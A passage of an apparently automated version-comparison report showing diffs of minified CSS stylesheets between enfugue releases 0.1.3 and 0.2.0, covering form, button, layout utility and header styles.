+:not(i),:not(i):after,:not(i):before{box-sizing:border-box}*{scrollbar-color:rgba(0,0,0,.25),transparent;scrollbar-width:thin}::-webkit-scrollbar{background:var(--darkest-color);height:14px;width:14px}::-webkit-scrollbar-thumb{background-clip:padding-box;background-color:hsla(0,0%,100%,.25);border:4px solid hsla(0,0%,100%,0);border-radius:7px;box-shadow:inset -1px -1px 0 rgba(0,0,0,.05),inset 1px 1px 0 rgba(0,0,0,.05);height:6px}::-webkit-scrollbar-thumb:hover{background-color:hsla(0,0%,100%,.35)}::-webkit-scrollbar-button{display:none;height:0;width:0}::-webkit-scrollbar-corner{background:var(--darkest-color)}body,html{font-family:var(--body-font),sans-serif;font-size:14px;font-weight:400;height:100%;width:100%}body{align-items:stretch;background-color:var(--darkest-color);display:flex;flex-flow:column nowrap;justify-content:stretch;position:relative}header{flex-grow:0;overflow:visible;z-index:5}header,main{box-sizing:border-box;flex-shrink:0;position:relative;width:100%}main{background-position:50%;background-size:cover;flex-grow:1;overflow:auto}footer{align-items:center;background-color:var(--darker-color);box-sizing:border-box;color:var(--lighter-color);display:flex;flex-flow:column nowrap;flex-grow:0;flex-shrink:0;font-size:8px;gap:4px;justify-content:center;padding:5px 0;position:relative;text-align:center;width:100%}.light-background{background-color:var(--lightest-color)}.semi-strong{font-weight:500}.strong,strong{font-weight:700}.black{font-weight:800}.ultra-black{font-weight:900}.half{margin:0 auto;width:50%}.em,em{font-style:italic}em.note{font-size:.75em;margin-top:2px}h1,h2,h3,h4,h5{font-family:var(--header-font),var(--body-font),sans-serif}h1{border-bottom:4px solid var(--theme-color-secondary);font-size:3rem;font-weight:700;line-height:1em;margin:0 0 1em;text-transform:uppercase}h1,h2{color:var(--theme-color-secondary)}h2{font-size:2rem}h2,h3{font-weight:500}h3{font-size:1.5rem;text-align:center}code,pre{font-family:var(--monospace-font),monospace;font-size:12px}.note{color:var(--theme-color-primary);font-size:.8em}fieldset,form{align-items:stretch;display:flex;gap:1em;justify-content:stretch;position:relative}form{flex-flow:column nowrap;padding:1em 1em 0}fieldset{flex-flow:row wrap}fieldset legend{align-items:center;border-bottom:2px solid var(--theme-color-tertiary);color:var(--theme-color-tertiary);display:flex;flex-flow:row nowrap;font-family:var(--header-font),sans-serif;font-size:16px;font-weight:700;justify-content:space-between;margin:0 0 .5em;padding:0 0 3px;width:100%}fieldset .field-container{align-items:stretch;display:flex;flex-basis:110px;flex-flow:column-reverse nowrap;flex-grow:1}fieldset.collapsed .field-container{display:none}fieldset.collapsible legend{cursor:pointer}fieldset.collapsible legend:after{border-bottom:7px solid transparent;border-right:7px solid var(--theme-color-tertiary);border-top:7px solid transparent;content:"\A";display:inline-block;height:0;transform:rotate(-90deg);transform-origin:center;transition:all .25s ease-in-out;width:0}fieldset.collapsed legend:after{transform:rotate(0deg)}fieldset .field-container goodydata-color-input,fieldset .field-container goodydata-search-list,fieldset .field-container input,fieldset .field-container select,fieldset .field-container textarea{flex-grow:1;margin:0;width:100%}fieldset .field-container.hidden-input-view{display:none}form label{color:var(--theme-color-secondary);display:inline-block;flex-grow:0;font-family:var(--header-font),sans-serif;font-size:14px;font-weight:400;margin-bottom:.25em;min-height:12px}form label.required:after{content:"*"}form .submit-buttons{align-items:stretch;display:flex;flex-flow:row nowrap;gap:1em;justify-content:stretch;margin-top:1em;position:relative}form .submit-buttons>*{flex-basis:100%}form input.cancel{background-color:var(--dark-color);border-color:var(--dark-color)}form input.cancel:not(:disabled):not(.disabled):hover{background-color:transparent;color:#fff}form .error{color:tomato}form p.error:not(:empty){margin:0 0 .5em}form>p.error:not(:empty){margin:1em 0 0}form.inline-form{padding:1em}form.inline-form,form.inline-form fieldset{border:none;flex-basis:100%;flex-flow:row nowrap}form.inline-form input[type=submit]{margin:0}form.inline-form fieldset.field-set-flags{flex-basis:30%;flex-grow:0;flex-shrink:0}form.inline-form fieldset legend{display:none}form.inline-form fieldset .field-container{flex-basis:100%;margin-right:4px}form.inline-form fieldset .field-container:not(.checkbox-input-view) label{display:none}form.embedded-form{background-color:rgba(0,0,0,.01);border:1px solid rgba(0,0,0,.2);margin:.5em;padding:1em}.field-container.checkbox-input-view{align-items:center;background-color:var(--theme-color-primary);border-radius:5px;cursor:pointer;display:flex;flex-flow:row nowrap;padding:0 10px;position:relative;transition:background-color .25s ease-in-out}.field-container.checkbox-input-view label{padding:1em 0}.field-container.checkbox-input-view:after{background-color:var(--lightest-color);bottom:0;left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .25s ease-in-out}.field-container.checkbox-input-view:hover:after{opacity:.1}.field-container.checkbox-input-view label{color:var(--lightest-color);cursor:pointer;display:block;flex-grow:1;margin-top:2.5px}.field-container.checkbox-input-view input{flex-grow:0;flex-shrink:0;height:15px;margin-right:5px;width:15px}form.inline-form fieldset .field-container input:not([type=checkbox]),form.inline-form fieldset .field-container select,form.inline-form fieldset .field-container textarea{margin:0}form.inline-form.show-legend{margin-top:.5em}form.inline-form.show-legend fieldset{align-items:center}form.inline-form.show-legend fieldset legend{display:block;position:absolute;top:-25px;width:calc(100% - 5px)}form.inset-form{background-color:var(--theme-color-secondary);border-radius:5px;margin:1em}form.inset-form fieldset legend{border-color:var(--lightest-color);color:var(--lightest-color)}@keyframes loadingBar{0%{left:1em;right:calc(100% - 2em)}50%{left:1em;right:1em}to{left:calc(100% - 2em);right:1em}}@keyframes loadingBarFull{0%{left:0;right:100%}50%{left:0;right:0}to{left:100%;right:0}}.loading-bar{position:relative}.loading-bar:after,form:after{animation-direction:alternate;animation-duration:.75s;animation-iteration-count:infinite;animation-name:loadingBar;animation-timing-function:ease-in-out;background-color:var(--theme-color-primary);border-radius:10px;bottom:0;content:"\A";height:7px;opacity:0;position:absolute;transition:opacity .15s ease-in-out}.loading-bar.loading:after,form.loading:after{opacity:1}.no-animations .loading-bar:after,.no-animations form:after{background:none;color:var(--theme-color-primary);content:"LOADING";display:block;font-size:11px;font-weight:900;margin-top:-20px;position:relative;text-align:center}a{color:var(--theme-color-primary);cursor:pointer;text-decoration:underline;transition:color .25s ease-in-out}a:hover{color:var(--theme-color-secondary)}input,select,textarea{background-color:var(--darker-color);border:1px solid #000;border-radius:5px;box-sizing:border-box;color:#fff;font-family:var(--body-font),sans-serif;margin:0 0 1em;outline:none;padding:10px 15px;transition:all .25s ease-in-out}select{padding:9px 5px}option{font-family:var(--body-font),sans-serif}input{padding:11px 15px}input.search{margin:1em;width:calc(100% - 2em)}input[type=file]{background-image:linear-gradient(to right,var(--theme-color-primary),var(--theme-color-primary));background-position:0;background-repeat:no-repeat;background-size:0 100%}input:disabled,select:disabled,textarea:disabled{color:var(--dark-color)}.button,button,input[type=button],input[type=submit]{background-color:var(--theme-color-primary);border:2px solid var(--theme-color-primary);box-sizing:border-box;color:var(--lightest-color);cursor:pointer;display:inline-block;font-family:var(--header-font),sans-serif;font-size:14px;font-weight:700;padding:.75rem 1.5rem;text-align:center;text-decoration:none;text-transform:uppercase;transition:color .25s ease-in-out,background-color .25s ease-in-out}.border-button,button.border-button,input[type=button].border-button,input[type=submit].border-button{background-color:transparent;border:2px solid var(--theme-color-primary);border-radius:2px;box-sizing:border-box;color:#444;cursor:pointer;display:inline-block;padding:.5em;text-align:center;text-decoration:none;transition:color .25s ease-in-out,border-color .25s ease-in-out}.button.disabled,.button:disabled,button.disabled,button:disabled,input[type=button].disabled,input[type=button]:disabled,input[type=submit].disabled,input[type=submit]:disabled{background-color:var(--darker-color);border-color:var(--dark-color);color:var(--dark-color);cursor:default}.border-button.disabled,.border-button:disabled,button.border-button.disabled,button.border-button:disabled,input[type=button].border-button.disabled,input[type=button].border-button:disabled,input[type=submit].border-button.disabled,input[type=submit].border-button:disabled{cursor:default;opacity:.5}.border-button.active,button.border-button.active,input[type=button].border-button.active,input[type=submit].border-button.active{border-color:var(--theme-color-primary);color:var(--theme-color-primary);cursor:default;opacity:1}.button:not(:disabled):not(.disabled):hover,button:not(:disabled):not(.disabled):hover,input[type=button]:not(:disabled):not(.disabled):hover,input[type=submit]:not(:disabled):not(.disabled):hover{background-color:transparent;color:var(--theme-color-primary)}.border-button:not(:disabled):not(.disabled):hover,button.border-button:not(:disabled):not(.disabled):hover,input[type=button].border-button:not(:disabled):not(.disabled):hover,input[type=submit].border-button:not(:disabled):not(.disabled):hover{border-color:var(--theme-color-primary);color:var(--theme-color-primary)}form ul.list-input-view{display:flex;flex-flow:row wrap;gap:6px}form ul.list-input-view li{background-color:transparent;border:2px solid var(--theme-color-primary);border-radius:5px;color:var(--theme-color-primary);cursor:pointer;font-size:12px;font-weight:700;overflow:hidden;padding:8px 14px;transition:color .25s ease-in-out,background-color .25s ease-in-out}form ul.list-input-view li.selected{background-color:var(--theme-color-primary);color:var(--lightest-color)}.loader{position:relative}.loader:after{backdrop-filter:blur(2px);background-position:50%;background-repeat:no-repeat;background-size:250px auto;bottom:0;content:"\A";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .4s ease-out;z-index:100}.loader.loader-cover:after{background-color:var(--lightest-color)}.loader.loading:after{opacity:1;pointer-events:auto}.loader.loader-scaled:after{background-size:75% auto}.loader.button:after{animation-direction:alternate;animation-duration:.75s;animation-iteration-count:infinite;animation-name:loadingBarFull;animation-timing-function:ease-in-out;background-color:var(--theme-color-tertiary);background-image:none;z-index:-1}.loader.button.loading{background:none;cursor:not-allowed}.shadowbox-container{align-items:center;backdrop-filter:blur(5px);background-color:rgba(0,0,0,.8);bottom:0;display:flex;flex-flow:row nowrap;justify-content:center;left:0;opacity:0;pointer-events:none;position:fixed;right:0;top:0;transition:opacity .5s ease-in-out;z-index:5}.shadowbox-container.active{opacity:1;pointer-events:auto}.shadowbox-container .box-container{background-color:#fff;padding:20px;width:calc(100% - 40px);z-index:6}.shadowbox-container .box-container a.close-shadowbox{color:#0146ad;cursor:pointer;display:block;font-size:30px;font-weight:900;margin-right:-5px;margin-top:-21px;padding-right:10px;text-align:right;text-decoration:none;z-index:7}.shadowbox-container iframe{border:none;outline:none;z-index:7}.tooltip-container{background-color:var(--darker-color);border:1px solid var(--light-color);border-radius:5px;color:var(--light-color);font-weight:300;max-width:75vw;opacity:0;padding:10px;pointer-events:none;position:fixed;transition:opacity .25s ease-in-out;white-space:break-spaces;z-index:99}.tooltip-container.active{opacity:1}.tooltip-container>p:not(:last-child){margin-bottom:1em}.notification-container{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;opacity:1;padding:5px;pointer-events:none;position:fixed;top:0;transition:opacity .5s ease-in-out;width:100%;z-index:6}.notification-container .notification{background-color:var(--darker-color);border:1px solid var(--light-color);border-radius:5px;color:var(--light-color);font-size:12px;font-weight:600;padding:10px}@keyframes slide-background{0%{background-position:0 0}to{background-position:100vw 0}}.sliding-gradient{animation-delay:0s;animation-duration:10s;animation-iteration-count:infinite;animation-name:slide-background;animation-timing-function:linear;background:linear-gradient(to right,var(--theme-color-primary),var(--theme-color-secondary),var(--theme-color-tertiary),var(--theme-color-primary));background-size:100vw 100%}@media (max-width:1024px){h1{font-size:3rem}h2{font-size:2rem}h3{font-size:1.5rem}}@media (max-width:768px){h1{font-size:2.5rem}}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/05-common.min.css` & `enfugue-0.2.0/enfugue/static/css/05-common.min.css`

 * *Files 4% similar despite different names*

```diff
@@ -1 +1 @@
-.triangle{height:0;width:0}.triangle.left,.triangle.right{border-bottom:10px solid transparent;border-top:10px solid transparent}.triangle.left{border-right:10px solid #fff}.triangle.right{border-left:10px solid #fff}.triangle.bottom,.triangle.top{border-left:10px solid transparent;border-right:10px solid transparent}.triangle.top{border-bottom:10px solid #fff}.triangle.bottom{border-top:10px solid #fff}.triangle.medium.left,.triangle.medium.right{border-bottom:15px solid transparent;border-top:15px solid transparent}.triangle.medium.left{border-right:15px solid #fff}.triangle.medium.right{border-left:15px solid #fff}.triangle.medium.bottom,.triangle.medium.top{border-left:15px solid transparent;border-right:15px solid transparent}.triangle.medium.top{border-bottom:15px solid #fff}.triangle.medium.bottom{border-top:15px solid #fff}.triangle.large.left,.triangle.large.right{border-bottom:20px solid transparent;border-top:20px solid transparent}.triangle.large.left{border-right:20px solid #fff}.triangle.large.right{border-left:20px solid #fff}.triangle.large.bottom,.triangle.large.top{border-left:20px solid transparent;border-right:20px solid transparent}.triangle.large.top{border-bottom:20px solid #fff}.triangle.large.bottom{border-top:20px solid #fff}.block{display:block!important}.inline{display:inline!important}.inline-block{display:inline-block!important}.mobile-show-block. .mobile-show-inline,.mobile-show-inline-block{display:none!important}.background,.foreground{background-position:50%;background-repeat:no-repeat;background-size:cover;bottom:0;left:0;position:absolute;right:0;top:0}.background.contain{background-size:contain}.background{z-index:1}.foreground{z-index:5}.uppercase{text-transform:uppercase}.no-text-transform{text-transform:none}.break-all{word-break:break-all}.no-padding{padding:0}.quarter-padded{padding:.25em}.half-padded{padding:.5em}.padded{padding:1em}.double-padded{padding:2em}.quarter-padded-horizontal{padding:0 .25em}.half-padded-horizontal{padding:0 .5em}.padded-horizontal{padding:0 1em}.double-padded-horizontal{padding:0 2em}.quarter-padded-vertical{padding:.25em 0}.half-padded-vertical{padding:.5em 0}.padded-vertical{padding:1em 0}.double-padded-vertical{padding:2em 0}.quarter-padded-top{padding:.25em 0 0}.half-padded-top{padding:.5em 0 0}.padded-top{padding:1em 0 0}.double-padded-top{padding:2em 0 0}.quarter-padded-right{padding:0 .25em 0 0}.half-padded-right{padding:0 .5em 0 0}.padded-right{padding:0 1em 0 0}.double-padded-right{padding:0 2em 0 0}.quarter-padded-bottom{padding:0 0 .25em}.half-padded-bottom{padding:0 0 .5em}.padded-bottom{padding:0 0 1em}.double-padded-bottom{padding:0 0 2em}.quarter-padded-left{padding:0 0 0 .25em}.half-padded-left{padding:0 0 0 .5em}.padded-left{padding:0 0 0 1em}.double-padded-left{padding:0 0 0 2em}.no-margin{margin:0}.quarter-margin{margin:.25em}.half-margin{margin:.5em}.margin{margin:1em}.double-margin{margin:2em}.quarter-margin-horizontal{margin:0 .25em}.half-margin-horizontal{margin:0 .5em}.margin-horizontal{margin:0 1em}.double-margin-horizontal{margin:0 2em}.quarter-margin-vertical{margin:.25em 0}.half-margin-vertical{margin:.5em 0}.margin-vertical{margin:1em 0}.double-margin-vertical{margin:2em 0}.quarter-margin-top{margin:.25em 0 0}.half-margin-top{margin:.5em 0 0}.margin-top{margin:1em 0 0}.double-margin-top{margin:2em 0 0}.quarter-margin-right{margin:0 .25em 0 0}.half-margin-right{margin:0 .5em 0 0}.margin-right{margin:0 1em 0 0}.double-margin-right{margin:0 2em 0 0}.quarter-margin-bottom{margin:0 0 .25em}.half-margin-bottom{margin:0 0 .5em}.margin-bottom{margin:0 0 1em}.double-margin-bottom{margin:0 0 2em}.quarter-margin-left{margin:0 0 0 .25em}.half-margin-left{margin:0 0 0 .5em}.margin-left{margin:0 0 0 1em}.double-margin-left{margin:0 0 0 2em}.container{display:block;margin:0 auto;max-width:1200px;width:100%}.center,.text-center{text-align:center}.hidden{display:none!important}.invisible{visibility:hidden}.clear{clear:both;display:block}.float-left{float:left}.float-right{float:right}.text-left{text-align:left}.text-right{text-align:right}.fill{display:inline-block;width:100%}.columns{display:block;font-size:0;vertical-align:top}.columns .column{box-sizing:border-box;display:inline-block;font-size:1rem;margin:0;vertical-align:top}.columns .column.half,.columns .column.one-half{width:50%}.columns .column.one-third{width:33.333333%}.columns .column.two-thirds{width:66.666667%}.flex-columns{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch}.flex-columns .column{flex-basis:100%}.flex-columns .column.two-thirds{flex-basis:200%}.flex-columns.half-spaced .column:not(:last-child){margin-right:.5em}.flex-columns.spaced .column:not(:last-child){margin-right:1em}.flex-columns.double-spaced .column:not(:last-child){margin-right:2em}.flex-rows{align-items:center;display:flex;flex-flow:column nowrap;justify-content:center}.flex-rows .row{width:100%}.column img{max-width:100%}.inline{display:inline}.inline-block{display:inline-block;width:auto}.tiny{font-size:.5em}sup.tiny{top:-.75em}.small{font-size:.75em}.large{font-size:2em}.larger{font-size:2.5em}.huge{font-size:3em}@media (max-width:768px){.half{width:100%}.flex-columns{flex-flow:column nowrap}.flex-columns.half-spaced .column:not(:last-child){margin-bottom:.5em;margin-right:0}.flex-columns.spaced .column:not(:last-child){margin-bottom:1em;margin-right:0}.flex-columns.double-spaced .column:not(:last-child){margin-bottom:2em;margin-right:0}.mobile-flex-columns-reverse{flex-flow:column-reverse nowrap}.mobile-half-padded{padding:.5em}.mobile-padded{padding:1em}.mobile-double-padded{padding:2em}.mobile-half-padded-horizontal{padding:0 .5em}.mobile-padded-horizontal{padding:0 1em}.mobile-double-padded-horizontal{padding:0 2em}.mobile-half-padded-vertical{padding:.5em 0}.mobile-padded-vertical{padding:1em 0}.mobile-double-padded-vertical{padding:2em 0}.mobile-half-padded-top{padding:.5em 0 0}.mobile-padded-top{padding:1em 0 0}.mobile-double-padded-top{padding:2em 0 0}.mobile-half-padded-right{padding:0 .5em 0 0}.mobile-padded-right{padding:0 1em 0 0}.mobile-double-padded-right{padding:0 2em 0 0}.mobile-half-padded-bottom{padding:0 0 .5em}.mobile-padded-bottom{padding:0 0 1em}.mobile-double-padded-bottom{padding:0 0 2em}.mobile-half-padded-left{padding:0 0 0 .5em}.mobile-padded-left{padding:0 0 0 1em}.mobile-double-padded-left{padding:0 0 0 2em}.mobile-no-margin{margin:0}.mobile-half-margin{margin:.5em}.mobile-margin{margin:1em}.mobile-double-margin{margin:2em}.mobile-half-margin-horizontal{margin:0 .5em}.mobile-margin-horizontal{margin:0 1em}.mobile-double-margin-horizontal{margin:0 2em}.mobile-half-margin-vertical{margin:.5em 0}.mobile-margin-vertical{margin:1em 0}.mobile-double-margin-vertical{margin:2em 0}.mobile-half-margin-top{margin:.5em 0 0}.mobile-margin-top{margin:1em 0 0}.mobile-double-margin-top{margin:2em 0 0}.mobile-half-margin-right{margin:0 .5em 0 0}.mobile-margin-right{margin:0 1em 0 0}.mobile-double-margin-right{margin:0 2em 0 0}.mobile-half-margin-bottom{margin:0 0 .5em}.mobile-margin-bottom{margin:0 0 1em}.mobile-double-margin-bottom{margin:0 0 2em}.mobile-half-margin-left{margin:0 0 0 .5em}.mobile-margin-left{margin:0 0 0 1em}.mobile-double-margin-left{margin:0 0 0 2em}.mobile-hide{display:none!important}.mobile-invisible{visibility:hidden!important}.mobile-show-block{display:block!important}.mobile-show-inline{display:inline!important}.mobile-show-inline-block{display:inline-block!important}.mobile-tiny{font-size:.5em}.mobile-small{font-size:.75em}.mobile-medium{font-size:1.5em}.mobile-large{font-size:2em}.mobile-larger{font-size:2.5em}.mobile-huge{font-size:3em}.columns .column.mobile-half{width:50%}.columns .column.mobile-one-third{width:33.333%}.colums .column.mobile-two-thirds{width:66.666%}}
+.triangle{height:0;width:0}.triangle.left,.triangle.right{border-bottom:10px solid transparent;border-top:10px solid transparent}.triangle.left{border-right:10px solid #fff}.triangle.right{border-left:10px solid #fff}.triangle.bottom,.triangle.top{border-left:10px solid transparent;border-right:10px solid transparent}.triangle.top{border-bottom:10px solid #fff}.triangle.bottom{border-top:10px solid #fff}.triangle.medium.left,.triangle.medium.right{border-bottom:15px solid transparent;border-top:15px solid transparent}.triangle.medium.left{border-right:15px solid #fff}.triangle.medium.right{border-left:15px solid #fff}.triangle.medium.bottom,.triangle.medium.top{border-left:15px solid transparent;border-right:15px solid transparent}.triangle.medium.top{border-bottom:15px solid #fff}.triangle.medium.bottom{border-top:15px solid #fff}.triangle.large.left,.triangle.large.right{border-bottom:20px solid transparent;border-top:20px solid transparent}.triangle.large.left{border-right:20px solid #fff}.triangle.large.right{border-left:20px solid #fff}.triangle.large.bottom,.triangle.large.top{border-left:20px solid transparent;border-right:20px solid transparent}.triangle.large.top{border-bottom:20px solid #fff}.triangle.large.bottom{border-top:20px solid #fff}.block{display:block!important}.inline{display:inline!important}.inline-block{display:inline-block!important}.mobile-show-block. .mobile-show-inline,.mobile-show-inline-block{display:none!important}.background,.foreground{background-position:50%;background-repeat:no-repeat;background-size:cover;bottom:0;left:0;position:absolute;right:0;top:0}.background.contain{background-size:contain}.background{z-index:1}.foreground{z-index:5}.uppercase{text-transform:uppercase}.no-text-transform{text-transform:none}.break-all{word-break:break-all}.no-padding{padding:0}.quarter-padded{padding:.25em}.half-padded{padding:.5em}.padded{padding:1em}.double-padded{padding:2em}.quarter-padded-horizontal{padding:0 .25em}.half-padded-horizontal{padding:0 .5em}.padded-horizontal{padding:0 1em}.double-padded-horizontal{padding:0 2em}.quarter-padded-vertical{padding:.25em 0}.half-padded-vertical{padding:.5em 0}.padded-vertical{padding:1em 0}.double-padded-vertical{padding:2em 0}.quarter-padded-top{padding:.25em 0 0}.half-padded-top{padding:.5em 0 0}.padded-top{padding:1em 0 0}.double-padded-top{padding:2em 0 0}.quarter-padded-right{padding:0 .25em 0 0}.half-padded-right{padding:0 .5em 0 0}.padded-right{padding:0 1em 0 0}.double-padded-right{padding:0 2em 0 0}.quarter-padded-bottom{padding:0 0 .25em}.half-padded-bottom{padding:0 0 .5em}.padded-bottom{padding:0 0 1em}.double-padded-bottom{padding:0 0 2em}.quarter-padded-left{padding:0 0 0 .25em}.half-padded-left{padding:0 0 0 .5em}.padded-left{padding:0 0 0 1em}.double-padded-left{padding:0 0 0 2em}.no-margin{margin:0}.quarter-margin{margin:.25em}.half-margin{margin:.5em}.margin{margin:1em}.double-margin{margin:2em}.quarter-margin-horizontal{margin:0 .25em}.half-margin-horizontal{margin:0 .5em}.margin-horizontal{margin:0 1em}.double-margin-horizontal{margin:0 2em}.quarter-margin-vertical{margin:.25em 0}.half-margin-vertical{margin:.5em 0}.margin-vertical{margin:1em 0}.double-margin-vertical{margin:2em 0}.quarter-margin-top{margin:.25em 0 0}.half-margin-top{margin:.5em 0 0}.margin-top{margin:1em 0 0}.double-margin-top{margin:2em 0 0}.quarter-margin-right{margin:0 .25em 0 0}.half-margin-right{margin:0 .5em 0 0}.margin-right{margin:0 1em 0 0}.double-margin-right{margin:0 2em 0 0}.quarter-margin-bottom{margin:0 0 .25em}.half-margin-bottom{margin:0 0 .5em}.margin-bottom{margin:0 0 1em}.double-margin-bottom{margin:0 0 2em}.quarter-margin-left{margin:0 0 0 .25em}.half-margin-left{margin:0 0 0 .5em}.margin-left{margin:0 0 0 1em}.double-margin-left{margin:0 0 0 2em}.container{display:block;margin:0 auto;max-width:1200px;width:100%}.center,.text-center{text-align:center}.hidden{display:none!important}.invisible{visibility:hidden}.clear{clear:both;display:block}.float-left{float:left}.float-right{float:right}.text-left{text-align:left}.text-right{text-align:right}.fill{display:inline-block;width:100%}.columns{display:block;font-size:0;vertical-align:top}.columns .column{box-sizing:border-box;display:inline-block;font-size:1rem;margin:0;vertical-align:top}.columns .column.half,.columns .column.one-half{width:50%}.columns .column.one-third{width:33.333333%}.columns .column.two-thirds{width:66.666667%}.flex-columns{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch}.flex-columns .column{flex-basis:100%}.flex-columns .column.two-thirds{flex-basis:200%}.flex-columns.half-spaced .column:not(:last-child){margin-right:.5em}.flex-columns.spaced .column:not(:last-child){margin-right:1em}.flex-columns.double-spaced .column:not(:last-child){margin-right:2em}.flex-rows{align-items:center;display:flex;flex-flow:column nowrap;justify-content:center}.flex-rows .row{width:100%}.column img{max-width:100%}.inline{display:inline}.inline-block{display:inline-block;width:auto}.tiny{font-size:.5em}sup.tiny{top:-.75em}.small{font-size:.75em}.large{font-size:2em}.larger{font-size:2.5em}.huge{font-size:3em}.no-animations,.no-animations *,.no-animations :after,.no-animations :before{animation-name:none!important}@media (max-width:768px){.half{width:100%}.flex-columns{flex-flow:column nowrap}.flex-columns.half-spaced .column:not(:last-child){margin-bottom:.5em;margin-right:0}.flex-columns.spaced .column:not(:last-child){margin-bottom:1em;margin-right:0}.flex-columns.double-spaced .column:not(:last-child){margin-bottom:2em;margin-right:0}.mobile-flex-columns-reverse{flex-flow:column-reverse nowrap}.mobile-half-padded{padding:.5em}.mobile-padded{padding:1em}.mobile-double-padded{padding:2em}.mobile-half-padded-horizontal{padding:0 .5em}.mobile-padded-horizontal{padding:0 1em}.mobile-double-padded-horizontal{padding:0 2em}.mobile-half-padded-vertical{padding:.5em 0}.mobile-padded-vertical{padding:1em 0}.mobile-double-padded-vertical{padding:2em 0}.mobile-half-padded-top{padding:.5em 0 0}.mobile-padded-top{padding:1em 0 0}.mobile-double-padded-top{padding:2em 0 0}.mobile-half-padded-right{padding:0 .5em 0 0}.mobile-padded-right{padding:0 1em 0 0}.mobile-double-padded-right{padding:0 2em 0 0}.mobile-half-padded-bottom{padding:0 0 .5em}.mobile-padded-bottom{padding:0 0 1em}.mobile-double-padded-bottom{padding:0 0 2em}.mobile-half-padded-left{padding:0 0 0 .5em}.mobile-padded-left{padding:0 0 0 1em}.mobile-double-padded-left{padding:0 0 0 2em}.mobile-no-margin{margin:0}.mobile-half-margin{margin:.5em}.mobile-margin{margin:1em}.mobile-double-margin{margin:2em}.mobile-half-margin-horizontal{margin:0 .5em}.mobile-margin-horizontal{margin:0 1em}.mobile-double-margin-horizontal{margin:0 2em}.mobile-half-margin-vertical{margin:.5em 0}.mobile-margin-vertical{margin:1em 0}.mobile-double-margin-vertical{margin:2em 0}.mobile-half-margin-top{margin:.5em 0 0}.mobile-margin-top{margin:1em 0 0}.mobile-double-margin-top{margin:2em 0 0}.mobile-half-margin-right{margin:0 .5em 0 0}.mobile-margin-right{margin:0 1em 0 0}.mobile-double-margin-right{margin:0 2em 0 0}.mobile-half-margin-bottom{margin:0 0 .5em}.mobile-margin-bottom{margin:0 0 1em}.mobile-double-margin-bottom{margin:0 0 2em}.mobile-half-margin-left{margin:0 0 0 .5em}.mobile-margin-left{margin:0 0 0 1em}.mobile-double-margin-left{margin:0 0 0 2em}.mobile-hide{display:none!important}.mobile-invisible{visibility:hidden!important}.mobile-show-block{display:block!important}.mobile-show-inline{display:inline!important}.mobile-show-inline-block{display:inline-block!important}.mobile-tiny{font-size:.5em}.mobile-small{font-size:.75em}.mobile-medium{font-size:1.5em}.mobile-large{font-size:2em}.mobile-larger{font-size:2.5em}.mobile-huge{font-size:3em}.columns .column.mobile-half{width:50%}.columns .column.mobile-one-third{width:33.333%}.colums .column.mobile-two-thirds{width:66.666%}}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/06-header.min.css` & `enfugue-0.2.0/enfugue/static/css/06-header.min.css`

 * *Files 14% similar despite different names*

```diff
@@ -1 +1 @@
-header{align-items:center;display:flex;flex-flow:row nowrap;height:25px;justify-content:space-between;overflow:hidden;text-transform:uppercase}header .background{background-repeat:repeat-x;z-index:-2}header:after{background-blend-mode:color-burn;background-image:linear-gradient(90deg,transparent 300px,rgba(0,0,0,.5) 600px);bottom:0;content:"\A";left:0;pointer-events:none;position:absolute;right:0;top:0;z-index:-1}header h1{border:none;color:var(--lightest-color);font-family:var(--body-font);font-size:21px;font-weight:900;letter-spacing:-1px;margin:0 0 0 4px;text-shadow:2px 2px 0 rgba(0,0,0,.5),4px 4px 0 rgba(0,0,0,.45),6px 6px 0 rgba(0,0,0,.4),8px 8px 0 rgba(0,0,0,.35),10px 10px 0 rgba(0,0,0,.3),12px 12px 0 rgba(0,0,0,.25),14px 14px 0 rgba(0,0,0,.2),16px 16px 0 rgba(0,0,0,.15),18px 18px 0 rgba(0,0,0,.1),20px 20px 0 rgba(0,0,0,.05)}header .logout{color:var(--light-color);cursor:pointer;margin-right:5px;opacity:.5;transition:all .25s ease-in-out}header .logout:hover{opacity:1}
+header{align-items:center;display:flex;flex-flow:row nowrap;height:25px;justify-content:space-between;overflow:hidden;text-transform:uppercase}header .background{background-repeat:repeat-x;z-index:-2}header:after{background-blend-mode:color-burn;background-image:linear-gradient(90deg,transparent 300px,rgba(0,0,0,.5) 600px);bottom:0;content:"\A";left:0;pointer-events:none;position:absolute;right:0;top:0;z-index:-1}header h1{border:none;font-family:var(--body-font);font-size:21px;font-weight:900;letter-spacing:-1px;margin:0 0 0 4px;text-shadow:2px 2px 0 rgba(0,0,0,.5),4px 4px 0 rgba(0,0,0,.45),6px 6px 0 rgba(0,0,0,.4),8px 8px 0 rgba(0,0,0,.35),10px 10px 0 rgba(0,0,0,.3),12px 12px 0 rgba(0,0,0,.25),14px 14px 0 rgba(0,0,0,.2),16px 16px 0 rgba(0,0,0,.15),18px 18px 0 rgba(0,0,0,.1),20px 20px 0 rgba(0,0,0,.05)}header h1,header i{color:var(--lightest-color)}header i{cursor:pointer;opacity:.5;transition:all .25s ease-in-out}header i:hover{opacity:1}header i.logout{margin-right:5px}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/07-main.min.css` & `enfugue-0.2.0/enfugue/static/css/07-main.min.css`

 * *Files 2% similar despite different names*

```diff
@@ -1 +1 @@
